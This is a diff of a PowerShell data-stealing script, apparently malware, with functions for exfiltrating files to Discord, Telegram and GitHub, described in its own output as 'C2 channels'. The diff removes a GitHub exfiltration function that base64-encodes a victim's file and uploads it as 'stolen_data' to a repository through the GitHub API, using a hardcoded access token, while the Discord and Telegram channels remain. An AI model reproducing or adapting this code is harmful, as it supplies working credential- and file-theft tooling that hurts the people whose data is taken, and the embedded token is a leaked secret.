@@ -240,29 +240,6 @@ function Exfil-Telegram {
     }
 }
 
-function Exfil-GitHub {
-    param([string]$FilePath)
-    try {
-        $token = "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"
-        $repo = "InfinityTeq/shadowLog"
-        $branch = "main"
-        $fileName = "stolen_data_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
-        
-        $base64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($FilePath))
-        $headers = @{ Authorization = "token $token"; Accept = "application/vnd.github.v3+json" }
-        $url = "https://api.github.com/repos/$repo/contents/$fileName"
-        
-        $payload = @{
-            message = "Exfiltrated data - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-            content = $base64
-            branch = $branch
-        } | ConvertTo-Json -Compress
-        
-        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $payload -ContentType "application/json" -TimeoutSec 30 -EA Stop | Out-Null
-        return $true
-    } catch { return $false }
-}
-
 function Exfil-All {
     param([string]$FilePath)
     
@@ -276,7 +253,6 @@ function Exfil-All {
     $methods = @(
         @{Name="Discord"; Function={Exfil-Discord $FilePath}},
         @{Name="Telegram"; Function={Exfil-Telegram $FilePath}},
-        @{Name="GitHub"; Function={Exfil-GitHub $FilePath}}
     )
     $success = 0
     Write-Host "📤 Exfiltrating to TWO C2 channels..." -ForegroundColor Yellow
